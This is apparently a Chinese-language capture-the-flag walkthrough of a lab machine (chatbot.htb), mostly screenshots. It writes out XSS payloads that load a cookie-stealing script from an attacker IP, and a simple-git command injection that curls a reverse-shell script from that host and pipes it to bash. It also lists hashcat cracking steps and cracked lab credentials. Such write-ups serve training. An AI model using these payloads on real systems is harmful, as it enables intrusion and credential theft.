
<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/1dd57d4b-1ad4-4592-9414-87e93fdb4b37" />

Nmap端口扫描，开放了22，80端口

<img width="416" height="218" alt="image" src="https://github.com/user-attachments/assets/5cff35a8-ee1c-4baf-a24d-03ebeb20405e" />

访问web页面，创建用户

<img width="415" height="235" alt="image" src="https://github.com/user-attachments/assets/1b9dfb41-ffa0-47b4-9c11-e1b21e4ca840" />

Contact页面尝试XSS

<img src=x onerror="document.location='http://10.10.16.5:8888/'"/>

<img width="415" height="240" alt="image" src="https://github.com/user-attachments/assets/1596ab06-7f49-4add-a75d-493cd1369d88" />

存在响应

<img width="416" height="120" alt="image" src="https://github.com/user-attachments/assets/06796781-7a65-49dc-9b99-472f239a5505" />

Payload.js获取cookie信息

<img width="325" height="270" alt="image" src="https://github.com/user-attachments/assets/4bf2fd9b-b337-42cd-9657-f121ffe4372a" />

<img src=x onerror="var script1=document.createElement('script');script1.src='http://10.10.16.5:5555/payload.js';document.head.appendChild(script1);"/>

之后会获取到一段base64
得到一个子域名
dev-git-auto-update.chatbot.htb

<img width="415" height="236" alt="image" src="https://github.com/user-attachments/assets/c81f1dcf-f55b-433b-a071-a853f02b481f" />

simple-git v3.14 漏洞利用

<img width="416" height="340" alt="image" src="https://github.com/user-attachments/assets/011e0702-f6af-4287-9436-b453386207de" />


https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221


ext::sh -c curl% http://10.10.16.5:3333/shell.sh|bash >&2

让他下载我们攻击机上的反弹shell文件

<img width="415" height="99" alt="image" src="https://github.com/user-attachments/assets/0feb322c-672f-4a87-a035-27986a9520fa" />

<img width="323" height="273" alt="image" src="https://github.com/user-attachments/assets/0d8e1cc4-744c-4470-9ee7-d30e639bea3e" />

<img width="415" height="166" alt="image" src="https://github.com/user-attachments/assets/82666f10-4962-41dd-a8ee-95a3771f037d" />

<img width="415" height="86" alt="image" src="https://github.com/user-attachments/assets/4cd602b8-9769-4665-bd92-12377cc19c01" />

横向移动

<img width="415" height="336" alt="image" src="https://github.com/user-attachments/assets/e4f970b3-58bf-42d1-8164-8f458e148a76" />

发现mongo DB

<img width="416" height="449" alt="image" src="https://github.com/user-attachments/assets/40254834-652a-421b-987a-9b12cbe95407" />

Mongo 进入数据库
Show dbs 查看数据库
Use testing 使用testing数据库
Show collections 查看所有表
Db.user.find() 查看所有user表下的信息

<img width="416" height="234" alt="image" src="https://github.com/user-attachments/assets/ea075818-9f57-4810-b1dd-f948f586d3a5" />

这里我们发现存在两个用户，一个admin和frank_dorky


hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

<img width="416" height="38" alt="image" src="https://github.com/user-attachments/assets/22f0809d-744a-4c04-b970-104b9eb03776" />

frank_dorky:manchesterunited

<img width="415" height="189" alt="image" src="https://github.com/user-attachments/assets/83f4f9e4-13f2-4df2-9fb5-47de4e71046f" />

这里不存在SUID和SUDO提权

<img width="416" height="233" alt="image" src="https://github.com/user-attachments/assets/75868c48-a4f8-42e4-8de7-61b0276a696e" />

<img width="230" height="71" alt="image" src="https://github.com/user-attachments/assets/ee067161-e572-4139-95da-dfc2346534f4" />

横向到kai_relay用户

<img width="415" height="160" alt="image" src="https://github.com/user-attachments/assets/52acddf5-7b25-44f2-beb6-ecd30ad79096" />

<img width="306" height="68" alt="image" src="https://github.com/user-attachments/assets/c12387cb-9044-4e29-a202-db15cdcb8c78" />

添加用户



将127.0.0.1 librenms.com添加到/etc/hosts

<img width="416" height="225" alt="image" src="https://github.com/user-attachments/assets/b9c4a050-964c-4c5a-b171-a9fa9aea6a6f" />

再用域名去访问

编辑template

<img width="415" height="227" alt="image" src="https://github.com/user-attachments/assets/3fa7f323-7701-4d9e-9822-716088349b76" />

<img width="416" height="138" alt="image" src="https://github.com/user-attachments/assets/d29d0e3d-a380-488a-9f72-c4ccd6b64245" />


横向到了librenms用户


当前目录下有一个.custom.env的隐藏文件

<img width="416" height="137" alt="image" src="https://github.com/user-attachments/assets/6dc69905-478e-4b9d-956d-be6ad00acf7c" />

里面包含了kai_relay用户的密码
DB_HOST=localhost
DB_DATABASE=librenms
DB_USERNAME=kai_relay
DB_PASSWORD=mychemicalformulaX

<img width="415" height="270" alt="image" src="https://github.com/user-attachments/assets/b12acf7d-81d4-4c12-81ca-02d9dcd13f11" />

这里具有一个sudo权限的文件

<img width="416" height="49" alt="image" src="https://github.com/user-attachments/assets/0b41d3ce-0ef0-47a8-a192-b4c95026d497" />

<img width="415" height="38" alt="image" src="https://github.com/user-attachments/assets/d50b8667-05f8-4b01-b1f6-cb8e21c0e3f5" />

<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/963a778a-5da8-455b-889c-8c82bf2bfe8f" />

存在漏洞
https://www.exploit-db.com/exploits/46544

<img width="415" height="211" alt="image" src="https://github.com/user-attachments/assets/19de2cee-c8c9-489e-a339-7f286bcfdbc9" />

最后一行是要执行的命令


我在上传一个反弹shell的文件

<img width="415" height="115" alt="image" src="https://github.com/user-attachments/assets/66eb614a-1d39-48c2-9adb-85741cf3a51d" />

<img width="415" height="209" alt="image" src="https://github.com/user-attachments/assets/bca5c709-e14f-4282-8010-de391e0eb6f0" />

利用这条命令去执行反弹shell文件


这里需要两个终端，一个执行office.sh
一个执行我们的lib.py

<img width="310" height="51" alt="image" src="https://github.com/user-attachments/assets/524a146e-b998-4ee4-b331-53d30777e840" />

<img width="369" height="55" alt="image" src="https://github.com/user-attachments/assets/336989b5-ad34-4203-8e2f-dddeab1f9f56" />

python3 lib.py --host localhost --port 2002

<img width="350" height="168" alt="image" src="https://github.com/user-attachments/assets/f5631ea2-a87e-4e7a-8fd6-f0b17769fc16" />
